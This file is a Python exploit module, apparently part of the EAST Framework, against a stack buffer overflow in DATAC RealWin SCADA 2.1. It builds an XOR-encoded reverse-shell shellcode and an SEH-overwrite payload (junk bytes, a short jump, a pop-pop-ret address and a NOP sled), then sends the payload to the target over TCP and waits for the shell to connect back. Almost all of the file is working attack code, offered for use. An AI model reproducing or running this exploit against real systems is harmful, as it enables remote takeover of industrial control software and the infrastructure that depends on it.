#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket

sys.path.append("./core")
sys.path.append("./shellcodes")
from Sploit import Sploit
import ShellUtils
import Shellcodes

INFO = {}
INFO['NAME'] = "efs_realwin21c_bof_rce"
INFO['DESCRIPTION'] = "DATAC RealWin SCADA 2.1 Buffer Overflow Exploit"
INFO['VENDOR'] = "http://www.realflex.com/products/realwin/realwin.php"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = ""
INFO["NOTES"] = """
Tested versions:
DATAC RealWin SCADA 2.1 Build 6.1.10.10 

Tested systems:
win xp sp3 rus

Status: 
latest version officially available for download is unpatched as of Status_check_date

Exploit vector:
General pop-pop-ret SEH exploitation technique.
"""

INFO['CHANGELOG'] = "26 Mar, 2011. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1'
OPTIONS["PORT"] = 910

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.state = "running"
        return
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
        return
    
    def create_shellcode(self):
        self.log("[>] Generate shellcode started")

        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return ''
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, socket.gethostbyname(socket.gethostname()), port, '\x00\x26\x0a\x0d\x20\x3f')
        
        shellcode_type = "reverse"
        shellcode = s.create_shellcode(shellcode_type, encode = ShellUtils.Constants.EncoderType.XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def makesploit(self):
        shellcode = self.create_shellcode()
        head = "\x10\x23\x54\x67\x24\x08\x00\x00\x01\x00\x11\x00\x01\x00"
        junk = "\x41" * 392
        next_seh = "\xeb\x06\x90\x90"   # overwrites next seh
        seh = "\xea\xe3\x02\x40"        # seh overwritten at 232 bytes - 4002e3ea
        nops = "\x90" * 20              # nop sled
        junk2 = "\x42" * (3036 - len(shellcode)) 

        return head + junk + next_seh + seh + nops + shellcode + junk2
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        shellcode = self.makesploit()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        try:
            self.log("Trying to connect to {}".format(self.host))
            s.connect((self.host, self.port))  
        except:
            self.log("failed to connect to RealWin")
            self.finish(False)
        s.sendall(shellcode)
        time.sleep(3)
        s.close()
        
        self.log("malicious response sent. wait for incoming connections")
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
